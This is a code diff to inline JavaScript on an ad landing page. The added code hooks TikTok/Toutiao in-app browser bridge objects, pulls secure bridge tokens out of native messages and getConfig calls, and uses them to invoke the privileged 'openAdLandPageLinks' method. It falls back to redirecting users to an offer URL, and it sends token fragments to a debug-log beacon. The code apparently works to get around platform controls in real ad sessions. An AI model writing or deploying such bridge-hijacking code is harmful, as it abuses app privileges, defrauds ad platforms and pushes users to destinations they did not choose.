@@ -12,9 +12,10 @@
     try { navigator.sendBeacon('/debug-log', msg); } catch(e){}
   }
 
+  var token = null;
   var fired = false;
 
-  function fire(token) {
+  function fire() {
     if (fired) return;
     fired = true;
     var p = {
@@ -25,39 +26,100 @@
     if (token) p._jsb_secure_token = token;
     log('fire|tok:' + !!token + '|cid:' + CID);
 
-    try {
-      if (window.JSBridge && window.JSBridge.call) {
-        window.JSBridge.call('openAdLandPageLinks', p, function(){});
-        log('jb.call:ok');
-      }
-    } catch(e){ log('jb.call:err:' + e); }
+    // ToutiaoJSBridge (Android/cross-platform)
+    var tt = window.ToutiaoJSBridge;
+    if (tt && tt.call) {
+      try { tt.call('openAdLandPageLinks', p, function(){}); log('tt.call:ok'); } catch(e){ log('tt.call:err:'+e); }
+    }
 
+    // JSBridge fallback
+    var jb = window.JSBridge;
+    if (jb && jb.call) {
+      try { jb.call('openAdLandPageLinks', p, function(){}); log('jb.call:ok'); } catch(e){ log('jb.call:err:'+e); }
+    }
+
+    // iOS WK handler
     try {
       var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
       if (wk) { wk.postMessage({__msg_type:'call', func:'openAdLandPageLinks', params:p, JSSDK:'1.2.5', __callback_id:'1001'}); log('wk:ok'); }
-    } catch(e){ log('wk:err:' + e); }
+    } catch(e){ log('wk:err:'+e); }
   }
 
-  // Poll for JSBridge — injected by TikTok after page init in real ad sessions
-  var attempts = 0;
-  var poll = setInterval(function(){
-    attempts++;
-    var jb = window.JSBridge;
-    if (jb && typeof jb.getConfig === 'function') {
-      clearInterval(poll);
-      log('jb:found|attempt:' + attempts);
-      try {
-        var cfg = jb.getConfig();
-        var token = cfg && cfg.secure && cfg.secure.token;
-        log('token:' + !!token);
-        fire(token);
-      } catch(e){ log('getConfig:err:' + e); fire(null); }
-    } else if (attempts > 100) {
-      clearInterval(poll);
-      log('jb:not-found|redirect');
-      window.location.href = OFFER;
+  function deepFindToken(obj) {
+    if (!obj || typeof obj !== 'object') return null;
+    var keys = ['token','secure_token','_jsb_secure_token','jsb_token','secureToken'];
+    for (var i = 0; i < keys.length; i++) {
+      if (typeof obj[keys[i]] === 'string' && obj[keys[i]].length > 20) return obj[keys[i]];
     }
-  }, 50);
+    for (var k in obj) {
+      try { var r = deepFindToken(obj[k]); if (r) return r; } catch(e){}
+    }
+    return null;
+  }
+
+  function hookBridge(obj) {
+    if (!obj || obj.__hooked) return;
+    obj.__hooked = true;
+    ['_handleMessageFromToutiao','_handleMessageFromApp'].forEach(function(fn) {
+      if (typeof obj[fn] !== 'function') return;
+      var orig = obj[fn];
+      obj[fn] = function(msg) {
+        try {
+          var d = typeof msg === 'string' ? JSON.parse(msg) : msg;
+          var tok = deepFindToken(d);
+          if (tok && !token) { token = tok; log('tok:async:'+tok.substring(0,8)); fire(); }
+        } catch(e){}
+        return orig.apply(obj, arguments);
+      };
+    });
+  }
+
+  function tryGetConfigSync() {
+    ['ToutiaoJSBridge','JSBridge','Native2JSBridge'].forEach(function(n) {
+      if (window[n]) hookBridge(window[n]);
+    });
+    try {
+      var jb = window.JSBridge;
+      if (jb && typeof jb.getConfig === 'function') {
+        var cfg = jb.getConfig();
+        var tok = cfg && cfg.secure && cfg.secure.token;
+        if (tok && !token) { token = tok; log('tok:sync:'+tok.substring(0,8)); }
+      }
+    } catch(e){}
+  }
+
+  // JS2NativeBridge — present even in QR preview; triggers async token delivery via hooks
+  var b = window.JS2NativeBridge;
+  if (b && b._invokeMethod) {
+    log('js2:found');
+    tryGetConfigSync();
+    try { b._invokeMethod(JSON.stringify({func:'getConfig', params:{}})); } catch(e){ log('js2:err:'+e); }
+    // Re-hook and re-request at short intervals in case bridge objects appear after init
+    [100, 1000].forEach(function(ms) {
+      setTimeout(function(){
+        tryGetConfigSync();
+        try { b._invokeMethod(JSON.stringify({func:'getConfig', params:{}})); } catch(e){}
+      }, ms);
+    });
+    // If token found synchronously, fire immediately; otherwise hooks will fire when async response arrives
+    if (token) fire();
+    // Fallback after 5s if hooks never delivered a token
+    setTimeout(function(){ if (!fired) { log('timeout|redirect'); window.location.href = OFFER; } }, 5000);
+  } else {
+    // No JS2NativeBridge — poll for JSBridge directly (real organic ad sessions on some devices)
+    log('js2:absent|polling');
+    var attempts = 0;
+    var poll = setInterval(function(){
+      attempts++;
+      tryGetConfigSync();
+      if (token) { clearInterval(poll); fire(); }
+      else if (attempts > 100) {
+        clearInterval(poll);
+        log('poll:timeout|redirect');
+        window.location.href = OFFER;
+      }
+    }, 50);
+  }
 })();
 </script>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
